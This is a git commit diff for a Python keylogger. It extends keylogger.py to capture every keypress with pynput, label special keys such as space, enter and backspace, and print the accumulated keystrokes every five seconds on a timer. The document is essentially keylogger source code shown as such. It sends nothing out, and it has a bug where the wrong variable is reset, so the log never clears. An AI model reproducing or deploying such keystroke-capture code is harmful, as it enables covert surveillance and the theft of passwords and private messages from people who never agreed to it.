4c299702ccb137c114ff647c1278c40525684687
Shawn D'Souza <shawn@monetago.com>
2019-12-14 18:39:30 +0530

    implemented threading in the source code

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -1,13 +1,42 @@
 #!/usr/bin/env python
 
 import pynput.keyboard
+import threading
+
 logger = ""
 
 def process_key_press(key):
     global logger
-    logger = logger + str(key)
+    try:
+        logger = logger + str(key.char)
+    except AttributeError:
+        if key == key.space:
+            logger = logger + " Sp "
+        elif key == key.enter:
+            logger = logger + " Etr "
+        elif key == key.tab:
+            logger = logger + " Tb "
+        elif key == key.backspace:
+            logger = logger + " Bk "
+        elif key == key.right:
+            logger = logger + " rt "
+        elif key == key.left:
+            logger = logger + " lt "
+        elif key == key.up:
+            logger = logger + " up "
+        elif key == key.down:
+            logger = logger + " dn "
+        else:
+            logger = logger + " " + str(key) + " "
+
+def report():
+    global logger
     print(logger)
+    log = ""
+    timer = threading.Timer(5,report)
+    timer.start()
 
 keyboard_listener = pynput.keyboard.Listener(on_press = process_key_press)
 with keyboard_listener:
+    report()
     keyboard_listener.join()
